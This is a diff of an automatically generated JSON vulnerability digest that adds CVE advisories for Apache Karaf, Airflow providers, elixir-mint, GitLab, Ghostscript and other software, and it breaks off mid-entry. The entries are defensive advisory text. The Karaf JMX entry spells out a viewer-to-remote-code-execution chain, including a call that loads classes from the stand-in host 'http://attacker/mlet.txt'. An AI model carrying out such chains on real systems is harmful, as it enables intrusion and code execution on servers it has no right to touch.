@@ -1,19 +1,19 @@
 {
-  "generated": "2026-09-29T08:54:23.493886+00:00",
-  "summary": "Today's digest contains 464 vulnerabilities across 5 sources. 93 zero-day exploits detected, 43 actively exploited from CISA KEV, and 16 Pakistan CERT/NCCS advisories.",
+  "generated": "2026-09-29T15:26:48.928500+00:00",
+  "summary": "Today's digest contains 610 vulnerabilities across 5 sources. 94 zero-day exploits detected, 44 actively exploited from CISA KEV, and 16 Pakistan CERT/NCCS advisories.",
   "stats": {
-    "new": 464,
+    "new": 610,
     "changed": 0,
     "removed": 0,
-    "total": 627981,
-    "zeroday": 93,
-    "exploited": 43,
+    "total": 628591,
+    "zeroday": 94,
+    "exploited": 44,
     "pakistan": 16
   },
   "sources": [
     {
       "name": "NVD/NIST",
-      "count": 355
+      "count": 500
     },
     {
       "name": "Exploit-DB",
@@ -21,7 +21,7 @@
     },
     {
       "name": "CISA KEV",
-      "count": 43
+      "count": 44
     },
     {
       "name": "Pakistan CERT",
@@ -335,6 +335,25 @@
       ],
       "url": "https://nccs.pk/NCCSBlog/TWICS.html",
       "cvss": "5.5",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-86950",
+      "desc": "Apple iOS, macOS, and iPadOS contain an out-of-bounds write vulnerability in CoreGraphics that may lead to arbitrary code execution.",
+      "severity": "CRITICAL",
+      "source": "CISA KEV",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": true,
+      "tags": [
+        "cisa",
+        "kev",
+        "actively-exploited",
+        "zero-day",
+        "Actively Exploited"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-86950",
+      "cvss": "9.0",
       "cwe": ""
     },
     {
@@ -3046,7 +3065,7 @@
     },
     {
       "id": "CVE-2026-91043",
-      "desc": "Allocation of Resources Without Limits or Throttling vulnerability in elixir-mint mint allows a malicious HTTP/2 server to exhaust memory on the client host and cause a denial of service.\n\nMint.HTTP2 enforces the client's max_header_list_size setting only on the compressed size of an inbound header block, while RFC 9113 section 6.5.2 defines the limit on the decoded header list. An HPACK indexed field costs one byte on the wire and decodes to a dynamic table entry of up to 4 KB, and join_cookie_headers/1 in lib/mint/http2.ex copies every cookie value of a response into one new binary. A header block under the default 256 KB wire limit therefore makes the client allocate about 1 GB for a single response, and several such responses in one delivery exhaust the memory of the process that owns the connection or of the whole VM.\n\nThis issue affects mint: from 1.1.0 before 1.11.0.",
+      "desc": "Allocation of Resources Without Limits or Throttling vulnerability in elixir-mint mint allows a malicious HTTP/2 server to exhaust memory on the client host and cause a denial of service.\n\nMint.HTTP2 enforces the client's max_header_list_size setting only on the compressed size of an inbound header block, while RFC 9113 section 6.5.2 defines the limit on the decoded header list. An HPACK indexed field costs one byte on the wire and decodes to a dynamic table entry of up to 4 KB, and join_cookie_headers/1 in lib/mint/http2.ex copies every cookie value of a response into one new binary. A header block under the default 256 KB wire limit therefore makes the client allocate about 1 GB for a single response, and several such responses in one delivery exhaust the memory of the process that owns the connection or of the whole VM.\n\nThis issue affects mint: from 1.1.0 before 1.10.2.",
       "severity": "MEDIUM",
       "source": "NVD/NIST",
       "date": "2026-09-28",
@@ -3064,7 +3083,7 @@
     },
     {
       "id": "CVE-2026-92103",
-      "desc": "Allocation of Resources Without Limits or Throttling vulnerability in elixir-mint mint allows a malicious HTTP/2 server to make the client hold up to about 16 MiB per connection in frames it should reject, consuming client memory.\n\nMint.HTTP2.Frame.decode_next/2 in lib/mint/http2/frame.ex compares a frame with the client's max_frame_size (16,384 bytes by default) only once the whole declared payload has arrived. Until then it returns :more, and Mint.HTTP2 keeps every received byte in the connection buffer. A server can declare a frame length of up to 16,777,215 bytes and withhold the last byte, keeping roughly 1,024 times the advertised limit buffered for as long as the connection stays open. The server has to send every byte the client buffers, so there is no amplification, and the buffer stops at the 24-bit frame length limit.\n\nThis issue affects mint: from 0.1.0 before 1.11.0.",
+      "desc": "Allocation of Resources Without Limits or Throttling vulnerability in elixir-mint mint allows a malicious HTTP/2 server to make the client hold up to about 16 MiB per connection in frames it should reject, consuming client memory.\n\nMint.HTTP2.Frame.decode_next/2 in lib/mint/http2/frame.ex compares a frame with the client's max_frame_size (16,384 bytes by default) only once the whole declared payload has arrived. Until then it returns :more, and Mint.HTTP2 keeps every received byte in the connection buffer. A server can declare a frame length of up to 16,777,215 bytes and withhold the last byte, keeping roughly 1,024 times the advertised limit buffered for as long as the connection stays open. The server has to send every byte the client buffers, so there is no amplification, and the buffer stops at the 24-bit frame length limit.\n\nThis issue affects mint: from 0.1.0 before 1.10.2.",
       "severity": "MEDIUM",
       "source": "NVD/NIST",
       "date": "2026-09-28",
@@ -3082,7 +3101,7 @@
     },
     {
       "id": "CVE-2026-94194",
-      "desc": "Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling') vulnerability in elixir-mint mint allows a malicious HTTP/1 server to desynchronize an intermediary and the Mint client on a pooled connection, poisoning the responses to subsequent requests that share the connection.\n\nmessage_body/1 in lib/mint/http1.ex selects chunked framing when chunked is the first coding listed in a response's Transfer-Encoding fields. RFC 9112 section 6.3 applies chunked framing only when chunked is the final coding, and otherwise reads the body until the server closes the connection. For a response such as Transfer-Encoding: chunked, gzip, an intermediary that follows the RFC treats every byte up to the close as the body, while Mint ends the body at the zero-length chunk and parses the remaining bytes as the response to the next request on the connection.\n\nMint also keeps the connection open after an HTTP/1.0 response, final or 1xx, that carries Transfer-Encoding and Connection: keep-alive. RFC 9112 section 6.1 requires treating the framing of such a message as faulty and closing the connection after it, so bytes after its chunked body are parsed as the response to the next request in the same way.\n\nThis issue affects mint: from 0.1.0 before 1.11.0.",
+      "desc": "Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling') vulnerability in elixir-mint mint allows a malicious HTTP/1 server to desynchronize an intermediary and the Mint client on a pooled connection, poisoning the responses to subsequent requests that share the connection.\n\nmessage_body/1 in lib/mint/http1.ex selects chunked framing when chunked is the first coding listed in a response's Transfer-Encoding fields. RFC 9112 section 6.3 applies chunked framing only when chunked is the final coding, and otherwise reads the body until the server closes the connection. For a response such as Transfer-Encoding: chunked, gzip, an intermediary that follows the RFC treats every byte up to the close as the body, while Mint ends the body at the zero-length chunk and parses the remaining bytes as the response to the next request on the connection.\n\nMint also keeps the connection open after an HTTP/1.0 response, final or 1xx, that carries Transfer-Encoding and Connection: keep-alive. RFC 9112 section 6.1 requires treating the framing of such a message as faulty and closing the connection after it, so bytes after its chunked body are parsed as the response to the next request in the same way.\n\nThis issue affects mint: from 0.1.0 before 1.10.2.",
       "severity": "MEDIUM",
       "source": "NVD/NIST",
       "date": "2026-09-28",
@@ -7542,6 +7561,2616 @@
       ],
       "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-84154",
       "cvss": "9.9",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-91012",
+      "desc": "org.apache.karaf.config.core.impl.ConfigRepositoryImpl#update(pid, properties),\nwhich backs the \"config\" MBean and the config:* shell commands, derives the file\nit writes a configuration to from caller-supplied input without checking that\nthe result stays inside ${karaf.etc}:\n\n  *  if the submitted property map contains a felix.fileinstall.filename entry, that value is turned directly into a File (getCfgFileFromProperty), so it can point to any absolute path the Karaf process can write to;\n  *  otherwise the configuration PID is concatenated verbatim into the target file name (generateConfigFilename(): new File(karaf.etc, pid + \".cfg\")), so a PID containing \"..\" segments resolves outside ${karaf.etc}. createFactoryConfiguration() has the same issue via the factory PID/alias.\n\n\nBoth code paths are reachable by any caller holding the \"manager\" role under Karaf's shipped command/JMX ACL (org.apache.karaf.command.acl.conf.cfg: \"update = manager\"). Such a user can therefore write attacker-controlled content to any file the Karaf process can write, including files the same ACL otherwise reserves to \"admin\" (etc/users.properties, etc/*.acl.*.cfg, etc/org.apache.karaf.management.cfg, and similar), allowing a manager-role user to grant themselves the admin role or otherwise take over the container.\n\n\n\n\n\n\nConfigMBeanImpl.install() and the config:install shell command already guarded the equivalent risk on their own code path with a finalname.contains(\"..\") string check, but that check does not stop absolute paths or symlink-based escapes, and it was never applied to ConfigRepositoryImpl.update() / createFactoryConfiguration() at all.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-91012",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-91048",
+      "desc": "The jdbc shell command scope shipped no org.apache.karaf.command.acl.jdbc.cfg. Karaf's command guard (SecuredSessionFactoryImpl) treats a command with no matching ACL rule as allowed, so any authenticated shell session (including one holding only the viewer role) could run every jdbc:* command. jdbc:ds-create stores a fully attacker-controlled JDBC URL into a pax-jdbc-config factory Configuration with no validation. pax-jdbc-config reactively turns that into a live DataSource. Several JDBC drivers run code or SQL at connection time based on URL parameters (e.g. H2 INIT=RUNSCRIPT), so a viewer-level shell user could reach arbitrary code execution, bypassing the admin-role gate that already protects shell:exec. This is a privilege-escalation-to-RCE chain, not merely an \"admin misconfiguration\".\n\n\nThe same applies to jms:* shell commands.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-91048",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-91085",
+      "desc": "Apache Karaf's shell/SSH command security is enforced by per-scope ACL configuration files (etc/org.apache.karaf.command.acl.<scope>.cfg). SecuredSessionFactoryImpl.checkSecurity() resolves the roles required for an invocation and, when no ACL rule matches the command, fails open: ACLConfigurationParser.Specificity.NO_MATCH sets passCheck = true. The safety valve for this, karaf.secured.command.compulsory.roles, ships commented out in etc/system.properties, so an unmatched command is allowed for any authenticated user.\n\n\nThe shipped org.apache.karaf.command.acl.config ACL (assemblies/features/standard/src/main/feature/feature.xml, mirrored into instance/.../etc/org.apache.karaf.command.acl.config.cfg) has no install entry. It restricts delete to admin, restricts edit/property-*/update on the jmx.acl.*, org.apache.karaf.command.acl.* and org.apache.karaf.service.acl.* PIDs to admin, and allows manager for everything else, but config:install was simply unmatched, and therefore allowed for any authenticated user, including one holding only the viewer role.\n\n\n\n\nconfig:install <url> <finalname> fetches url and writes it into ${karaf.etc} as finalname. It calls PathUtils.checkWithin() to block .. traversal outside karaf.etc, but that folder holds every security-relevant file Karaf ships: users.properties, keys.properties, host.key, and all org.apache.karaf.*.acl.* files, including the very ACL file that (mis)governs this command. With -o/--override, an existing file is overwritten with attacker-controlled bytes fetched from an arbitrary URL.\n\n\n\n\nBecause felix.fileinstall.dir = ${karaf.etc} (etc/config.properties), Felix FileInstall also watches and reloads any .cfg file dropped there, closing the loop without requiring a restart.\n\n\n\n\nBy contrast, bundle:install, feature:install and kar:install are all admin-only in their own ACLs, and config:delete is admin in this same ACL, config:install was the outlier.\n\nMitigationAdd install = admin in etc/org.apache.karaf.command.acl.config.cfg (create the file is absent), and/or set karaf.secured.command.compulsory.roles=admin in etc/system.properties (and restart) to make unmatched commands fail closed by default.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-91085",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-92142",
+      "desc": "Apache Karaf exposes a JMX MBeanServer guarded by KarafMBeanServerGuard, which enforces role-based access control (RBAC) on MBean operations invoked over the remote JMX connector (RMI registry/server, enabled by default on ports 1099 and 44444). The guard is implemented as a java.lang.reflect.Proxy around the MBeanServer, and only forwards a fixed list of operation names to the RBAC check, defined in MBeanInvocationHandler#guarded:\n\n\n  private final List<String> guarded = Collections.unmodifiableList( Arrays.asList(\"invoke\", \"getAttribute\", \"getAttributes\", \"setAttribute\", \"setAttributes\"));\n\n\n\n\nThe MBean lifecycle operations MBeanServer#createMBean, #registerMBean and #unregisterMBean are not in this list. Calls to these methods are forwarded directly to the underlying MBeanServer with no role check at all, regardless of the roles configured in etc/jmx.acl.*.cfg.\n\n\n\n\nAs a result, any user who can authenticate to the JMX endpoint, including a user holding only the least-privileged \"viewer\" role, can call createMBean() to instantiate an arbitrary class as a MBean, and unregisterMBean() to remove it again afterwards, with no authorization check and no audit log entry (logging in KarafMBeanServerGuard only occurs on the RBAC-denial path, which this bypass never reaches).\n\n\n\n\nThis is significant because javax.management.loading.MLet, a standard JDK MBean, can be instantiated this way. MLet acts as a remote classloader: its getMBeansFromURL(URL) operation fetches an MLet text file from an attacker-controlled URL and instantiates and registers the classes it lists as new MBeans in the target JVM. Reaching this operation still goes through KarafMBeanServerGuard's existing \"invoke\" check, but the default etc/jmx.acl.cfg grants the \"viewer\" role to any method name matching the wildcard rule \"get* = viewer\", a heuristic intended for read-only getters. Because \"getMBeansFromURL\" happens to start with \"get\", it also matches that rule, so a default installation grants \"viewer\" callers permission to invoke it without any Karaf-specific ACL naming MLet at all. Combined with the createMBean gap, this gives a \"viewer\"-role JMX client a path to remote code execution to the Karaf JVM:\n\n  *  Authenticate to JMX as any user with any role (e.g. \"viewer\").\n  *  mbs.createMBean(\"javax.management.loading.MLet\", objectName) is not in GUARDED_OPERATIONS, no RBAC check, MLet is instantiated and registered.\n  *  mbs.invoke(objectName, \"getMBeansFromURL\", new Object[]{\"http://attacker/mlet.txt\"}, ...) is guarded, but the method name matches the default \"get* = viewer\" ACL rule, so permitted.\n  *  The remote .mlet file is fetched and its listed classes are loaded and registered as new MBeans, running attacker-supplied code in the Karaf JVM.\n  *  mbs.unregisterMBean(objectName) can be used to remove the MLet afterwards, also not in GUARDED_OPERATIONS, no RBAC check, no audit trail.\n\n\nThe fix adds createMBean, registerMBean and unregisterMBean to the guarded operation list, resolves required roles for them from the jmx.acl* configuration by ObjectName and (for createMBean/registerMBean) MBean class name, and ships default etc/jmx.acl.cfg entries restricting all three operations to the \"admin\" role. This allows deployments to also write class-name-specific rule, e.g.:\n\n\n\n\ncreateMBean(java.lang.String)[/javax\\.management\\.loading\\..*/] = admin\n\n\n\n\nApache Karaf users should upgrade to 4.4.12 or 4.5.0 or later, once released, as soon as possible. Until an upgrade is available, restrict network access to the JMX RMI registry/server ports (1099/44444) to trusted hosts, or avoid issuing any non-\"admin\" JMX credentiels.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-92142",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-96428",
+      "desc": "SQL Injection in the /WebAgenda/SMBAjaxAutoComplete.do API endpoint of Flowring Agentflow 4.0 version before 2025/08/08 allows remote attackers to execute arbitrary SQL commands via the words parameter.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-96428",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-96429",
+      "desc": "SQL Injection in the /WebAgenda/SMBAjaxConfigProcess.do API\nendpoint of Flowring Agentflow 4.0 version before 2025/08/08 allows\nremote attackers to execute arbitrary SQL commands via the id parameter.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-96429",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-96430",
+      "desc": "Exposed Dangerous Method or Function in the\n/WebAgenda/SQLWin.do API endpoint of Flowring Agentflow 4.0 version Before 2026/08/28 allows remote\nauthenticated users to execute arbitrary SQL commands via the sql parameter.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-96430",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-96431",
+      "desc": "Unrestricted Upload of File with Dangerous Type in the\n/WebAgenda/download/uploadFile.jsp API endpoint of Flowring Agentflow 4.0 version\nbefore 2023/03/24 allows remote authenticated users to execute arbitrary\nsystem commands via a malicious file.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-96431",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-96440",
+      "desc": "Improper Limitation of a Pathname to a Restricted\nDirectory（Path Traversal） in the /WebAgenda/download/uploadFile.jsp\nAPI endpoint of Flowring Agentflow 4.0 version before 2023/03/24 allows remote\nauthenticated users to write files to arbitrary locations outside the intended\nupload directory via the path parameter.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-96440",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-102473",
+      "desc": "A flaw was found in dash. When built without libc fnmatch, the internal pmatch() matcher implements * by unbounded recursion over candidate positions. A local user who can plant filenames, or otherwise feed that matcher, can make a short multi-star pattern such as *.*.*.*.*.tar.gz consume excessive CPU.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-102473",
+      "cvss": "5.5",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-102474",
+      "desc": "A flaw was found in dash. The printf builtin reserves four bytes before converting a Unicode \\u or \\U escape, but the multi-byte token can need five or six bytes. A local user who can supply such an escape to dash printf or echo %b, including through dash -c and a positional argument, can write one or two bytes past that reservation.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-102474",
+      "cvss": "4.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-10518",
+      "desc": "GitLab has remediated an issue in GitLab EE affecting all versions from 17.9 before 19.2.7, 19.3 before 19.3.3, and 19.4 before 19.4.1 that under certain conditions could have allowed an authenticated user with guest-level permissions to read private security policy content they were not authorized to access due to improper authorization enforcement.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-10518",
+      "cvss": "4.3",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-11796",
+      "desc": "Asset Suite allows unauthenticated users to access PropertiesReloadServlet, CacheFlushServlet, MetadataCacheFlushServlet and ResourceBundleReloadServlet, which could result in denial-of-service conditions affecting application availability. These servlets are designed to perform specific functions within production environment depending on how the Asset Suite application is configured.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-11796",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-15390",
+      "desc": "Das U-Boot with CONFIG_IP_DEFRAG=y parameter fails to clear IP reassembly state after delivering a complete datagram. An attacker who can deliver fragmented IP traffic can execute arbitrary code by sending duplicated last-fragment IP packets.\n\n\nThis issue was fixed in commit b1aec609bb5e0d08c25c888c91935287ab4ee5fa in version 2026.07.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-15390",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-19547",
+      "desc": "Ghostscript for Windows is vulnerable to local privilege escalation through PostScript resource file hijacking. Due to the application searching for PostScript resource files in predictable paths under C:\\\\gs\\\\ that do not exist by default on Windows installations, combined with Windows default ACLs allowing any authenticated user to create directories at the root of C:\\\\, an attacker who is an authenticated local user can create the expected directory structure and plant a malicious PostScript file. When any user or service subsequently runs Ghostscript, the planted file is automatically loaded and executed with the full privileges of the Ghostscript process. This results in full compromise of Ghostscript process context, as well as running arbitrary code on the machine with Ghostscript process privileges.\n\n\nThis issue was fixed in version 10.08.0.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-19547",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-4523",
+      "desc": "GitLab has remediated an issue in GitLab CE/EE affecting all versions from 15.11 before 19.2.7, 19.3 before 19.3.3, and 19.4 before 19.4.1 that under certain conditions could have allowed an unauthenticated user to read CI/CD job trace contents containing sensitive variable values due to improper authorization enforcement in the GraphQL API.",
+      "severity": "LOW",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-4523",
+      "cvss": "3.7",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-76718",
+      "desc": "A potential security vulnerability in HPE OneView can be exploited to allow remote session hijacking or other unauthorized actions.",
+      "severity": "HIGH",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-76718",
+      "cvss": "8.2",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-76719",
+      "desc": "A security vulnerability in HPE OneView may be exploited remotely to perform session hijacking, data theft or other unauthorized actions.",
+      "severity": "HIGH",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-76719",
+      "cvss": "8.2",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-76720",
+      "desc": "A vulnerability in HPE OneView can be remotely exploited to cause a URL redirect.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-76720",
+      "cvss": "4.3",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-7395",
+      "desc": "Asset Suite allows unauthenticated users to access HTTPPublishAdapterTestServlet that can be used for configuration file upload, leading to information disclosure and integrity compromise. The HTTPPublishAdapterTestServlet is specifically meant for testing purposes to be used in a non-production environment.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-7395",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-81862",
+      "desc": "Apache Airflow's Teradata provider embedded cloud storage credentials directly into SQL statements. `S3ToTeradataOperator` and `AzureBlobStorageToTeradataOperator` interpolate the source bucket's credentials as plain string literals into the `CREATE MULTISET TABLE ... LOCATION` statement whenever the bucket is private and no `teradata_authorization_name` is configured — which is the default credential path for both operators. The statement is then logged and executed, so the credentials reach two places outside the operator's control.\n\nThe two operators expose different credentials through different channels, and deployments should check both. `S3ToTeradataOperator` takes its values from `s3_hook.get_credentials()`, which under an instance profile or IRSA returns runtime AWS credentials that were never registered with Airflow's secrets masker — and the STS session token is runtime-generated and therefore unmasked even when an AWS connection is configured. Those credentials appear **in the Airflow task log**, readable by any user with log-view permission on the Dag. `AzureBlobStorageToTeradataOperator` takes its storage account key from the connection, so the masker usually redacts the task-log copy; its exposure is the Teradata side. **Both** operators write the credentials into Teradata's DBQL query logs and live monitoring views, where Airflow's masking never applies and the values persist for that system's log retention period.\n\nAffects deployments using either operator against a private bucket or container without a Teradata `AUTHORIZATION` object. Users are advised to upgrade to `apache-airflow-providers-teradata` `3.7.0` or later, which keeps the credential-bearing statement out of the Airflow task log. Upgrading does not remove the credentials from Teradata's query logs and monitoring views, which Airflow cannot redact: users should configure `teradata_authorization_name` with a Teradata `AUTHORIZATION` object so that credentials are never inlined, and should rotate any credentials previously used through the inline path.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-81862",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-81914",
+      "desc": "Apache Airflow's Google provider built Google Drive search expressions by interpolating file and folder names directly into single-quoted string literals, without escaping the quote character that delimits them. A name containing an apostrophe therefore terminated the literal early and appended clauses of the attacker's choosing to the query.\n\nThe names are frequently not written by the Dag author. In a wildcard `gcs_to_gdrive` transfer they come from the source bucket listing, so anyone able to create objects in that bucket controls them — typically an external data producer or an ingest-only service account, a different trust principal from the Dag author. An injected clause can broaden the match and so steer which file or folder the hook resolves: an upload can be directed into a folder the attacker named, and, because downloads select the most recently modified match, a download can return a file they placed rather than the one the Dag asked for.\n\nAffects deployments passing externally-sourced names to the Google Drive hook, including wildcard `gcs_to_gdrive` transfers from buckets writable by less-trusted principals. Users are advised to upgrade to `apache-airflow-providers-google` `22.6.0` or later, which escapes quote and backslash characters in every value interpolated into a Drive query.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-81914",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-81930",
+      "desc": "Apache Airflow's Snowflake provider did not validate the connection's `account` and `region` fields before interpolating them into request URLs. The SQL API endpoint is built as `https://{account}.snowflakecomputing.com/api/v2/statements`, so an `account` value containing `/`, `?` or `#` demotes the intended domain to a path, query or fragment and leaves the attacker in control of the request host.\n\nThe provider sends that request with an `Authorization: Bearer` header carrying a JWT minted from the connection's private key, or the configured OAuth or programmatic access token. A user who can edit the Snowflake connection but cannot read its secrets — Airflow gives connection-configuration users write-only access to stored credentials, and a `private_key_file` lives on the worker rather than in the connection — can therefore cause a valid token for the account to be delivered to a host of their choosing and replay it against the genuine Snowflake endpoint. No Dag-authoring ability is required: the attacker edits the connection and waits for an existing Dag to use it. The same unvalidated value was also used to build the OAuth token-request URL and the Cortex Agent base URL.\n\nAffects deployments where Snowflake connections are editable by users who are not trusted with the connection's credentials. Users are advised to upgrade to `apache-airflow-providers-snowflake` `6.18.0` or later, which rejects `account` and `region` values containing anything other than letters, digits, `.`, `_` and `-` in every URL the provider builds from them.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-81930",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-84739",
